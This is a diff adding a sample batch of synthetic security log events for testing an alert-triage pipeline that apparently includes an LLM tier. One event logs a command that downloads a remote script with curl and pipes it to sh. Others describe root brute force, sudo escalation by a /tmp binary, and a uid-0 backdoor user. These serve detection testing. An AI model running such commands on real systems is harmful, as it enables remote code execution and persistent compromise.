@@ -1,0 +1,26 @@
+# Sample batch — one JSON event per line. Lines starting with # are ignored.
+# Scenario 1: recurring benign backup IO spike on db-prod-01 (7 occurrences).
+# The LLM tier should suppress the first few via the environment fact; once the
+# signature has 5 benign verdicts, the prefilter starts suppressing for free.
+{"source": "node_exporter", "host": "db-prod-01", "event_type": "io_anomaly", "message": "nightly disk IO spike on /var/lib/postgresql during backups window", "severity": 2.0, "fields": {"iops": 9200}}
+{"source": "node_exporter", "host": "db-prod-01", "event_type": "io_anomaly", "message": "nightly disk IO spike on /var/lib/postgresql during backups window", "severity": 2.0, "fields": {"iops": 8800}}
+{"source": "node_exporter", "host": "db-prod-01", "event_type": "io_anomaly", "message": "nightly disk IO spike on /var/lib/postgresql during backups window", "severity": 2.0, "fields": {"iops": 9500}}
+{"source": "node_exporter", "host": "db-prod-01", "event_type": "io_anomaly", "message": "nightly disk IO spike on /var/lib/postgresql during backups window", "severity": 2.0, "fields": {"iops": 9100}}
+{"source": "node_exporter", "host": "db-prod-01", "event_type": "io_anomaly", "message": "nightly disk IO spike on /var/lib/postgresql during backups window", "severity": 2.0, "fields": {"iops": 8700}}
+{"source": "node_exporter", "host": "db-prod-01", "event_type": "io_anomaly", "message": "nightly disk IO spike on /var/lib/postgresql during backups window", "severity": 2.0, "fields": {"iops": 9300}}
+{"source": "node_exporter", "host": "db-prod-01", "event_type": "io_anomaly", "message": "nightly disk IO spike on /var/lib/postgresql during backups window", "severity": 2.0, "fields": {"iops": 9000}}
+# Scenario 2: clear attack — brute force then success on the public web server.
+{"source": "sshd", "host": "web-prod-01", "event_type": "auth_bruteforce", "message": "48 failed password attempts for root from 185.220.101.7 in 60s, then accepted password", "severity": 8.5, "fields": {"src_ip": "185.220.101.7", "user": "root"}}
+# Scenario 3: suspicious exec on the crown-jewel DB — prefilter should catch on score alone.
+{"source": "auditd", "host": "db-prod-01", "event_type": "process_exec", "message": "postgres user executed: bash -c 'curl -s http://45.83.20.11/x.sh | sh'", "severity": 6.0, "fields": {"user": "postgres", "pid": 41822}}
+# Scenario 4: privilege escalation attempt on a LOW-value asset — score is modest,
+# so this lands in the ambiguous band and the LLM must catch it.
+{"source": "auditd", "host": "dev-laptop-42", "event_type": "priv_escalation", "message": "user jenny added to sudo group by process /tmp/.helper; new crontab entry installed", "severity": 6.0, "fields": {"user": "jenny", "binary": "/tmp/.helper"}}
+# Scenario 5: unknown asset appears in logs creating a new user — unknown hosts
+# get elevated criticality (1.3) and should escalate via the LLM tier.
+{"source": "auditd", "host": "unknown-host-99", "event_type": "user_created", "message": "new user 'support_tmp' created with uid 0", "severity": 5.0, "fields": {"user": "support_tmp", "uid": 0}}
+# Scenario 6: expected container churn on the CI runner, covered by a fact.
+{"source": "auditd", "host": "ci-runner-01", "event_type": "process_burst", "message": "212 short-lived containers spawned in 10m by runner process churn", "severity": 4.0, "fields": {"count": 212}}
+# Scenario 7: garden-variety failed login, no history yet — should escalate
+# (low confidence to suppress) until the memory layer learns it.
+{"source": "sshd", "host": "web-prod-01", "event_type": "auth_failure", "message": "failed password for invalid user admin from 203.0.113.9", "severity": 3.0, "fields": {"src_ip": "203.0.113.9", "user": "admin"}}
